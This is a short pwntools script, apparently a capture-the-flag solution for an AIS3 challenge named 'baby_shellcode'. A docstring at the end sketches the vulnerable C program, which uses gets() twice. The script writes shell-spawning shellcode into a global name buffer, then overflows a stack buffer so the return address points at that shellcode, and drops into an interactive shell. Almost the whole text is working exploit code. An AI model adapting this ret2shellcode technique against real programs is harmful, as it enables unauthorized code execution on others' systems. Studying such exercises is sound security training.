from pwn import *

#r = remote('mf-pwn.ais3.org', 10102)
r = process('./baby_shellcode')
#gdb.attach(r)

input_address = 0x7fffffffdc80
return_address = 0x7fffffffdc98
name_address = 0x601080

context.arch='amd64'
shell_code = asm(shellcraft.amd64.sh())
r.sendlineafter('What your name?\n', shell_code)

overflow = b'A' * (return_address - input_address) + p64(name_address)
r.sendlineafter('Say something:', overflow)

r.interactive()


"""
char name[?];

int main(){
    puts("What's your name?");
    gets(name);
    printf("Hello %s! \nSay something", name);
    char something[?];
    gets(something);
    return 0;
}
"""
